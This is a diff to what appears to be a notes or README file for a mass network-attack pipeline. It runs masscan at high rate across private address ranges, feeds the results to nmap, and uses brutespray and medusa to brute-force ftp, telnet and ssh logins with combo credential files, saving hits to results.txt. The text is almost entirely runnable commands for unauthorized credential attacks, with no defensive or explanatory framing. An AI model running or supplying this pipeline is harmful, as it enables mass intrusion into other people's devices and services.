@@ -2,7 +2,12 @@ apt install medusa
 
 
 
-python3 brutespray.py --file nmap.xml -U user.txt -P pass.txt --service ftp,telnet,ssh --threads 5 --hosts 5 -i -c >> results.txt
+python3 brutespray.py --file nmap.xml --combo login.txt --service ftp,telnet,ssh --threads 5 --hosts 5 -c >> results.txt
+
+--combo
+:user:pass
+:user1:pass1
+
 
 
 bash MOH
@@ -10,9 +15,9 @@ docker run --rm adarnimrod/masscan -p80,443 --rate=20000 192.168.0.0/16 172.16.0
 python3 fileformatter.py # here we clean the brut file
 python3 scan2.py -f ips.txt >> results.txt # then scan the ip/ports
 rm ips.txt # remove the temporary file
-docker run --rm adarnimrod/masscan -p21,23,22 --rate=20000 192.168.0.0/16 172.16.0.0/14 10.0.0.0/14 >> ips.txt # Save scan masscan Range 
+docker run --rm adarnimrod/masscan -p21,23,22 --rate=20000 192.168.0.0/16 172.16.0.0/14 10.0.0.0/14 >> ports.txt # Save scan masscan Range 
 python3 fileformatter2.py # here we clean the brut file
-nmap -vv -iL ips.txt -p 21,23,22 -oX nmap.xml #  scan list ip masscan
-python3 brutespray.py --file nmap.xml -U user.txt -P pass.txt --service ftp,telnet,ssh --threads 5 --hosts 5 -i -c >> results.txt #  crack ftp,telnet,vnc
+nmap -vv -iL ports.txt -p 21,23,22 -oX nmap.xml #  scan list ip masscan
+python3 brutespray.py --file nmap.xml --combo login.txt --service ftp,telnet,ssh --threads 5 --hosts 5 -c >> results.txt #  crack ftp,telnet,vnc
 rm nmap.xml # remove the temporary file
 rm ips.txt # remove the temporary file
